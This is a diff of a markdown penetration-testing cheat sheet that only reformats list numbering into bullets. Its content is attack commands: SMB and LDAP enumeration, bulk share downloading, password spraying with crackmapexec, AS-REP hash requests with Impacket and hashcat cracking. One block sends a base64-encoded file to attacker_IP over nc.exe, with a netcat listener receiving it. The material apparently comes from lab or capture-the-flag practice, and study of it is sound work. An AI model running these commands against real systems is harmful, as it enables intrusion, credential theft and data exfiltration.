@@ -37,48 +37,48 @@ tcpdump -i any dst port xx
 
 
 ## SMB
-1. SMB Protocol enumeration:
+*  SMB Protocol enumeration:
 ```
 nmap -p445 --script smb-protocols x.x.x.x
 ```
 
 
-2. Check for SMB Vulnerability
+*  Check for SMB Vulnerability
 ```
 nmap --script smb-vuln* x.x.x.x
 ```
 
-3. Get a list of shares available on a host
+*  Get a list of shares available on a host
 ```
 smbclient -L x.x.x.x
 ```
 
-4. Connect to the share
+*  Connect to the share
 ```
 smbclient //x.x.x.x/Share_Name
 ```
 
-5. SMBMap for checking access on fileshares
+*  SMBMap for checking access on fileshares
 ```
 smbmap -H x.x.x.x -u Username -p Password or smbmap -u '' -p '' -d 'domain.name' -H x.x.x.x
 ```
 
-6. Download all files in shares:
+*  Download all files in shares:
 ```
 smbget -R smb://x.x.x.x/Share -U Username
 ```
 
-7. Use crackmapexec for spraying
+*  Use crackmapexec for spraying
 ```
 crackmapexec smb 10.10.10.175 -u Users.txt -p Pass.txt --continue-on-success
 ```
 
-8. Host smbserver by using impacket
+*  Host smbserver by using impacket
 ```
 impacket-smbserver -smb2support name $(pwd)
 ```
 
-9. Anonymous login and file enumeration using smbmap
+*  Anonymous login and file enumeration using smbmap
 ```
 smbmap -H x.x.x.x -u anonymous -r --depth
 ```
@@ -86,12 +86,12 @@ smbmap -H x.x.x.x -u anonymous -r --depth
 
 
 ## LDAP
-1. Basic enumeration
+*  Basic enumeration
 ```
 ldapsearch -x -h domain.local -b "dc=domain,dc=local"
 ```
 
-2. Check for Null enumeration
+*  Check for Null enumeration
 ```
 ldapsearch -x -h x.x.x.x -D '' -w '' -b "DC=domain,DC=local"
 ```
@@ -104,7 +104,7 @@ ldapsearch -x -h x.x.x.x -D '' -w '' -b "DC=domain,DC=local"
 certutil -encode file.zip file.b64
 cat file.b64 | cmd /c C:\windows\temp\nc.exe attacker_IP 4444
 ```
-And locally:
+   And locally:
 
 ```
 nc -lvp 4444 > file.b64 // Remove certificates markers from top and bottom
@@ -127,12 +127,12 @@ VHostScan -t local.domain -w /opt/VHostScan/VHostScan/wordlists/virtual-hostscan
 
 
 ## Impacket Script
-1. Get Password Hash of User Accounts:
+*  Get Password Hash of User Accounts:
 ```
 python3 GetNPUsers.py local.domain/ -dc-ip 10.10.10.175 -request -usersfile = To provide users
 ```
 
-later use below command to crack the password:
+    later use below command to crack the password:
 ```
 hashcat -m 18200 -a 0 Hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
